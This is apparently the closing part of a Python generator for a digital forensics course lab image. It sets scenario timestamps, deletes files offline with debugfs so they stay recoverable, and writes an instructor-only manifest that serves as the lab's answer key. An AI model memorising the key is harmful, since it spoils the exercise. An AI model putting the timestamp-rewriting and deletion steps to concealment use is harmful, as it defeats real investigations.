    "home/alex/Downloads/.cache_sync/transfer_manifest.txt",
    "home/alex/.local/share/WhatsApp/chat_export_Kestrel.txt",
    "home/alex/.config/Signal/logs/conversation_notes.txt",
    "home/alex/Downloads/temporary_credentials.txt",
    "var/log/finance_api/access.log.1",
]


# ============================================================
# TIMESTAMPS
# ============================================================

def apply_timestamps():
    """
    Rewrite atime and mtime across the mounted tree so the filesystem
    timeline matches the scenario described in the logs.

    Without this, every MAC time in the image reads as the instructor's
    build date and `mactime` output is meaningless -- which is fatal
    for a lab whose entire premise is timeline analysis. See
    INSTRUCTOR_GUIDE.md section 3.5.

    ctime and dtime are NOT adjustable from userspace and will still
    show build time. That is deliberate and the handout uses it.
    """

    print()
    print("[+] Applying scenario timestamps...")

    default = to_epoch(DEFAULT_SCENARIO_TIME)

    paths = sorted(
        MOUNT_POINT.rglob("*"),
        key=lambda item: len(item.parts),
        reverse=True,
    )

    for path in paths:
        if path.name == "lost+found":
            continue

        try:
            os.utime(path, (default, default))
        except OSError:
            pass

    for relative_path, (accessed, modified) in TIMESTAMPS.items():
        target = MOUNT_POINT / relative_path

        if not target.exists():
            continue

        try:
            os.utime(target, (to_epoch(accessed), to_epoch(modified)))
        except OSError:
            pass

    print(f"[+] Timestamps applied to {len(paths)} filesystem entries.")


def restamp_directories():
    """
    Re-apply directory timestamps after the deletion pass.

    Unlinking a file bumps the parent directory's mtime to the current
    clock, which would leave obvious build-date fingerprints on exactly
    the directories students are asked to examine most closely.
    """

    default = to_epoch(DEFAULT_SCENARIO_TIME)

    for path in sorted(
        MOUNT_POINT.rglob("*"),
        key=lambda item: len(item.parts),
        reverse=True,
    ):
        if not path.is_dir() or path.name == "lost+found":
            continue

        relative = str(path.relative_to(MOUNT_POINT))

        if relative in TIMESTAMPS:
            accessed, modified = TIMESTAMPS[relative]
            times = (to_epoch(accessed), to_epoch(modified))
        else:
            times = (default, default)

        try:
            os.utime(path, times)
        except OSError:
            pass

    try:
        os.utime(MOUNT_POINT, (default, default))
    except OSError:
        pass


# ============================================================
# BUILD IMAGE
# ============================================================

def delete_evidence_offline(partition_dev):
    """
    Delete DELETED_FILES (and the staging directory) with debugfs on the
    unmounted partition, preserving size and block pointers in each
    freed inode so that `icat` can recover them.

    debugfs exits 0 even when a command fails, so its output is checked
    for errors explicitly -- otherwise a typo in a path would silently
    ship an image with a missing deleted file.
    """

    commands = [f"rm /{path}" for path in DELETED_FILES]

    # Alex ran `rm -rf` on the staging directory, so the directory goes
    # too. Its name surviving in the parent's directory entries is part
    # of the evidence.
    commands.append("rmdir /home/alex/Downloads/.cache_sync")

    command_file = BUILD_DIR / "debugfs_delete.cmds"
    command_file.write_text("\n".join(commands) + "\n", encoding="utf-8")

    print("[+] debugfs -w -f " + str(command_file) + " " + str(partition_dev))

    result = subprocess.run(
        ["debugfs", "-w", "-f", str(command_file), str(partition_dev)],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        check=False,
    )

    print(result.stdout)

    problems = [
        line
        for line in result.stdout.splitlines()
        if any(
            marker in line.lower()
            for marker in ("not found", "not empty", "error", "cannot", "invalid")
        )
    ]

    if result.returncode != 0 or problems:
        raise SystemExit(
            "[-] debugfs reported problems deleting evidence:\n    "
            + "\n    ".join(problems or [f"exit code {result.returncode}"])
        )

    print(f"[+] Deleted {len(DELETED_FILES)} files and the staging directory.")


def wait_for_partition_node(loop_dev, timeout=15):
    """
    Wait until /dev/loopNp1 exists.

    `losetup -P` returns before udev has necessarily created the
    partition device node, so running mkfs immediately afterwards is a
    real race on Ubuntu -- it fails intermittently with "The file
    /dev/loopNp1 does not exist". Settle udev, ask the kernel to rescan,
    and if the node still is not there, create it from sysfs ourselves.
    """

    import time

    node = Path(f"{loop_dev}p1")
    name = node.name

    deadline = time.time() + timeout

    while time.time() < deadline:
        if node.exists():
            return str(node)

        if shutil.which("udevadm"):
            subprocess.run(["udevadm", "settle"], check=False)

        if shutil.which("partprobe"):
            subprocess.run(["partprobe", loop_dev], check=False)

        sysfs_dev = Path(f"/sys/class/block/{name}/dev")

        if sysfs_dev.exists() and not node.exists():
            major, minor = sysfs_dev.read_text().strip().split(":")
            os.mknod(
                node,
                0o660 | 0o060000,
                os.makedev(int(major), int(minor)),
            )

        time.sleep(0.25)

    raise SystemExit(
        f"[-] Partition device {node} never appeared. "
        "Check that `parted` created the partition table."
    )


def create_image():

    global CURRENT_LOOP_DEV

    print()
    print("=" * 70)
    print("CREATING FORENSIC DISK IMAGE")
    print("=" * 70)

    run([
        "dd",
        "if=/dev/zero",
        f"of={IMAGE_PATH}",
        "bs=1M",
        f"count={IMAGE_SIZE_MB}",
        "status=progress",
    ])

    # ----------------------------------------------------
    # MBR partition table with a single primary partition.
    #
    # The handout requires students to run `mmls`, read the start
    # sector, and pass it to every later Sleuth Kit command with -o.
    # An image formatted directly with mkfs has no partition table and
    # `mmls` fails outright.
    # ----------------------------------------------------

    run(["parted", "--script", str(IMAGE_PATH), "mklabel", "msdos"])

    run([
        "parted",
        "--script",
        str(IMAGE_PATH),
        "mkpart",
        "primary",
        "ext2",
        PARTITION_START,
        "100%",
    ])

    loop_dev = run_output([
        "losetup",
        "--find",
        "--show",
        "-P",
        str(IMAGE_PATH),
    ])

    CURRENT_LOOP_DEV = loop_dev

    # Anything that fails between attaching the loop device and the
    # main try/finally below must still release it, or the next run
    # inherits a stale /dev/loopN.
    try:
        partition_dev = wait_for_partition_node(loop_dev)

        run([f"mkfs.{FS_TYPE}", "-F", "-L", FS_LABEL, partition_dev])

        MOUNT_POINT.mkdir(parents=True, exist_ok=True)

        run(["mount", partition_dev, str(MOUNT_POINT)])
    except BaseException:
        cleanup_mount()
        raise

    try:
        print()
        print("[+] Copying evidence into filesystem...")

        run(["cp", "-a", str(EVIDENCE_ROOT) + "/.", str(MOUNT_POINT)])
        run(["sync"])

        # ----------------------------------------------------
        # Realistic permissions
        # ----------------------------------------------------

        print("[+] Setting file permissions...")

        permissions = [
            ("700", "home/alex"),
            ("700", "home/priya"),
            ("700", "home/jordan"),
            ("600", "home/alex/.bash_history"),
            ("600", "home/alex/.bash_history.1"),
            ("600", "home/alex/.ssh/config"),
            ("600", "home/alex/.ssh/known_hosts"),
            ("700", "home/alex/.local/bin/tobor_sync.sh"),
            ("700", "home/alex/Downloads/.cache_sync"),
            ("755", "home/alex/Documents/maintenance.sh"),
            ("644", "etc/report-scheduler/scheduler.env"),
            ("700", "mnt/recovered_backup/home/backupadmin"),
            ("600", "mnt/recovered_backup/home/backupadmin/.bash_history"),
        ]

        for mode, relative_path in permissions:
            target = MOUNT_POINT / relative_path

            if target.exists():
                run(["chmod", mode, str(target)])

        run(["sync"])

        # ----------------------------------------------------
        # Timestamps BEFORE deletion.
        #
        # Unlinking preserves a file's mtime and atime on the inode,
        # so stamping first means the deleted files carry scenario
        # times into `mactime` output too.
        # ----------------------------------------------------

        apply_timestamps()
        run(["sync"])

        # ----------------------------------------------------
        # Unmount BEFORE deleting anything.
        #
        # Deleting through the mounted filesystem does not work for
        # this lab, on ext2 or ext4. The Linux kernel zeroes the
        # inode's size and block pointers when it frees a file, and
        # stamps mtime/ctime with the current clock. `fls -d` would
        # still list the filename, but `istat` reports size 0, `icat`
        # returns nothing, and the scenario mtime is destroyed.
        #
        # debugfs deletes at the filesystem level instead: it frees
        # the inode and its blocks and records a dtime, but leaves
        # the size and block pointers in the inode. That is what a
        # real deleted-but-not-yet-overwritten file looks like, and it
        # is what makes `icat` recovery work.
        # ----------------------------------------------------

        print()
        print("[+] Unmounting before offline deletion...")
        run(["umount", str(MOUNT_POINT)])

        print()
        print("=" * 70)
        print("CREATING DELETED-FILE EVIDENCE")
        print("=" * 70)

        delete_evidence_offline(partition_dev)
        run(["sync"])

    finally:
        print()
        print("[+] Releasing loop device...")
        cleanup_mount()


# ============================================================
# HASH IMAGE
# ============================================================

def calculate_hash():

    print()
    print("=" * 70)
    print("CALCULATING EVIDENCE HASH")
    print("=" * 70)

    result = subprocess.check_output(
        ["sha256sum", str(IMAGE_PATH)],
        text=True,
    ).strip()

    HASH_PATH.write_text(result + "\n", encoding="utf-8")

    print()
    print("[+] SHA-256:")
    print(f"    {result}")

    return result


# ============================================================
# CREATE MANIFEST
# ============================================================

def create_manifest(image_hash):

    print()
    print("=" * 70)
    print("CREATING EVIDENCE MANIFEST")
    print("=" * 70)

    grand = WORKBOOK_STATS.get("__grand__", {"rows": 0, "total": 0.0})
    sync = WORKBOOK_STATS.get("__sync_totals__", {"files": 0, "bytes": 0})

    workbook_lines = []

    for key, label in (
        ("q1_recon", "Q1_2026_Bank_Reconciliation.xlsx"),
        ("q2_recon", "Q2_2026_Bank_Reconciliation.xlsx"),
        ("wire_ledger", "Wire_Transfer_Ledger_2026.xlsx"),
        ("payroll", "Payroll_Disbursements_2026.xlsx"),
        ("client_master", "Client_Bank_Accounts_Master.csv"),
    ):
        stats = WORKBOOK_STATS[key]
        workbook_lines.append(
            f"  {label:<40} {stats['rows']:>7,} rows  "
            f"${stats['total']:>18,.2f}  {stats['bytes']:>9,} bytes"
        )

    deleted_lines = "\n".join(f"- {path}" for path in DELETED_FILES)

    manifest = f"""CYBR 2800 DIGITAL FORENSICS
FORENSIC EVIDENCE MANIFEST -- LAB 3 OF 3
========================================

*** INSTRUCTOR ONLY. DO NOT DISTRIBUTE. ***
This file names every deleted artifact and every indicator. Handing it
to students converts the investigation into a transcription exercise.

Case Number:
{CASE_NUMBER} -- "The Tobor Transfer"

Evidence Image:
{IMAGE_NAME}

Image Size:
{IMAGE_SIZE_MB} MB

Partition Table:
MBR (msdos), single primary partition starting at {PARTITION_START}

Filesystem:
{FS_TYPE}

Evidence Image SHA-256:
{image_hash}

----------------------------------------
HOW THE DELETED FILES WERE MADE RECOVERABLE
----------------------------------------
Deleting through a mounted Linux filesystem does NOT leave recoverable
files, on ext2 or ext4: the kernel zeroes the inode's size and block
pointers and overwrites mtime/ctime. `fls -d` still shows the name, but
`icat` returns 0 bytes. This image was built by unmounting first and
deleting with `debugfs rm` / `debugfs rmdir`, which frees the inode and
blocks but leaves size, block pointers, and scenario mtime intact.

Validate before class:

    mmls {IMAGE_NAME}
    fls -r -d -o 2048 {IMAGE_NAME}
    icat -o 2048 {IMAGE_NAME} <INODE> | wc -c

A non-zero byte count for a deleted .xlsx means recovery works.

Expect {len(DELETED_FILES)} recoverable files plus the deleted
.cache_sync directory, and TWO extra phantom entries named "^" (inode
2049, 0 bytes) under mnt/finance_share/bank_statements/ and
mnt/recovered_backup/archives/. Those are directory-block slack
artifacts, not deleted files. They are left in deliberately: the
handout tells students not to count them.

----------------------------------------
SCENARIO
----------------------------------------
Continuation of Labs 1 and 2. The subject, {USER_SUBJECT}, used a
never-rotated service token belonging to {USER_SERVICE} to pull
financial reports from the finance reporting application
(fin-app01, {HOST_FIN_APP}), staged them in a hidden directory, and
transferred them to an unmanaged personal laptop, {TOBOR_NETBIOS}
({TOBOR_FQDN}), attached to the corporate VLAN.

THE PIVOT (the finding students are meant to reach by correlation):
{TOBOR_LEASE_OLD} -- the unattributed SSH brute-force source from
Lab 2 -- and {TOBOR_LEASE_NEW} -- the exfiltration destination -- are
two DHCP leases issued to the SAME MAC address, {TOBOR_MAC},
hostname {TOBOR_NETBIOS}. The lease flips at {LEASE_FLIP_TIME}.

Three independent artifacts support this and no single one is
sufficient:
  1. var/log/dhcpd.log  -- both leases, same MAC
  2. home/alex/.ssh/known_hosts -- identical host key for both IPs
  3. etc/hosts          -- manual entry mapping {TOBOR_LEASE_NEW} to
                           "{TOBOR_FQDN}", absent from etc/asset_inventory.csv

----------------------------------------
QUANTIFIED EXPOSURE (grading key)
----------------------------------------
Recoverable from the deleted staging directory:

{chr(10).join(workbook_lines)}

  GRAND TOTAL{' ' * 30}{grand['rows']:>7,} rows  ${grand['total']:>18,.2f}

Distinct client accounts represented: {len(CLIENTS)}

Transfer volume (two independent sources that should agree):
  home/alex/.local/state/tobor_sync.log : {sync['files']:,} files, {sync['bytes']:,} bytes
  var/log/network_connections.log       : rsync/scp byte counts, 2026-08-20

Incident-day transfer only (4 runs, 15:03-15:47):
  346 files, 1,000,452,077 bytes

----------------------------------------
INTENTIONALLY DELETED EVIDENCE ({len(DELETED_FILES)} files, 5 directories)
----------------------------------------
{deleted_lines}

Note: home/alex/Downloads/.cache_sync is itself removed, so the
staging path only exists as deleted directory entries.

----------------------------------------
INDICATOR SET
----------------------------------------
Hosts:
- {HOST_WORKSTATION}  workstation (subject system, imaged)
- {HOST_APP01}  app01            (Lab 2 continuity)
- {HOST_BACKUP01}  backup01         (Lab 2 continuity)
- {HOST_DB01}  db01             (Lab 2 continuity)
- {HOST_FIN_APP}  fin-app01        (finance reporting API)
- {HOST_FIN_DB}  fin-db01
- {HOST_FILESHARE}  fileshare01      (/mnt/finance_share)
- {HOST_VPN01}   vpn01
- {TOBOR_LEASE_OLD}  TOBOR-RM lease 1 (Lab 2's unattributed host)
- {TOBOR_LEASE_NEW}  TOBOR-RM lease 2 (exfiltration destination)

MAC: {TOBOR_MAC} ({TOBOR_NETBIOS})
SSH host key shared by both leases: {TOBOR_HOSTKEY}

Accounts:
- {USER_SUBJECT}        subject
- {USER_BACKUP}  service account (Lab 2 continuity)
- {USER_ANALYST}        legitimate finance analyst (control group)
- {USER_SERVICE}  service account whose token was reused
- {USER_NOISE}      unrelated user (noise)

Key artifacts:
- home/alex/.bash_history        (cleared at the end; see .1)
- home/alex/.bash_history.1      (rotated; rsync + tar survive here)
- home/alex/.local/bin/tobor_sync.sh   (TIMESTOMPED: mtime 2025-01-05)
- home/alex/.local/state/tobor_sync.log
- var/log/dhcpd.log              (the pivot)
- var/log/finance_api/access.log (403 recon -> 200 bulk extraction)
- var/log/dlp_alerts.log         (14 alerts, none reviewed)
- var/log/usb_events.log         (RED HERRING: only 800 bytes copied)
- etc/report-scheduler/scheduler.env   (world-readable service token)

----------------------------------------
DELIBERATE TRAPS
----------------------------------------
1. usb_events.log shows a USB drive attached on the incident day, but
   only 800 bytes were written to it. Students who conclude "USB
   exfiltration" have not quantified anything.
2. priya performs legitimate heavy financial access all year. Access
   to financial data is not itself incriminating; the distinguishing
   features are the service-token reuse, the scripted agent, the
   403-then-200 progression, and the destination.
3. tobor_sync.sh has an mtime predating the system it talks to. The
   contradiction between mtime and ctime is the intended example for
   the timestamp-reliability section.
4. "Kestrel" is never identified. The correct answer to "who received
   the data" is that the evidence does not establish it.

----------------------------------------
SCENARIO TIMESTAMPS
----------------------------------------
atime and mtime are set to narrative dates across the whole tree so
`fls -m` + `mactime` produce a usable timeline (resolves
INSTRUCTOR_GUIDE.md section 3.5).

ctime and dtime still reflect build time. This is intentional and the
handout uses it as the concrete example of why a single timestamp is
never sufficient. (ext2 records no creation time.)

----------------------------------------
FORENSIC HANDLING
----------------------------------------
Preserve the generated image as the instructor master. Distribute a
duplicate plus the SHA-256 value only. Publish the hash in Canvas, not
inside the download.

========================================
"""

    MANIFEST_PATH.write_text(manifest, encoding="utf-8")

    print(f"[+] Manifest created: {MANIFEST_PATH}")


# ============================================================
# FINAL VERIFICATION
# ============================================================

def verify_image():

    print()
    print("=" * 70)
    print("FINAL VERIFICATION")
    print("=" * 70)

    if not IMAGE_PATH.exists():
        print("[-] Evidence image was not created.")
        sys.exit(1)

    if not HASH_PATH.exists():
        print("[-] Hash file was not created.")
        sys.exit(1)

    if IMAGE_PATH.stat().st_size == 0:
        print("[-] Evidence image is empty.")
        sys.exit(1)

    print()
    print("[+] Evidence image exists.")
    print(f"[+] Size: {IMAGE_PATH.stat().st_size:,} bytes")
    print(f"[+] SHA-256 file: {HASH_PATH}")
    print(f"[+] Manifest: {MANIFEST_PATH}")

    print()
    print("Files created:")
    print()
    print(f"  {IMAGE_PATH}")
    print(f"  {HASH_PATH}")
    print(f"  {MANIFEST_PATH}")


# ============================================================
# MAIN
# ============================================================

def main():

    print()
    print("=" * 70)
    print("CYBR 2800 FORENSIC EVIDENCE GENERATOR -- LAB 3 OF 3")
    print(f"CASE {CASE_NUMBER} -- \"The Tobor Transfer\"")
    print("=" * 70)

    require_root()
    check_tools()

    cleanup()

    create_evidence_files()
    create_image()

    image_hash = calculate_hash()

    create_manifest(image_hash)

    verify_image()

    cleanup_mount()

    if BUILD_DIR.exists():
        shutil.rmtree(BUILD_DIR)

    print()
    print("=" * 70)
    print("FORENSIC EVIDENCE IMAGE COMPLETE")
    print("=" * 70)

    print()
    print("NEXT STEPS -- do these before class:")
    print()
    print("  1. Freeze the master:")
    print(f"       chmod 444 {IMAGE_NAME}")
    print()
    print("  2. Confirm the partition table is readable:")
    print(f"       mmls {IMAGE_NAME}")
    print()
    print("  3. CONFIRM DELETED-FILE RECOVERY RETURNS DATA:")
    print(f"       fls -r -d -o 2048 {IMAGE_NAME}")
    print(f"       icat -o 2048 {IMAGE_NAME} <INODE> | wc -c")
    print("     A zero byte count means the recovery sections are broken.")
    print()
    print("  4. Move the manifest OUT of the distribution folder.")
    print("     It is an answer key.")
    print()
    print("  5. Publish the SHA-256 in Canvas, separately from the image.")
    print()


if __name__ == "__main__":
    main()
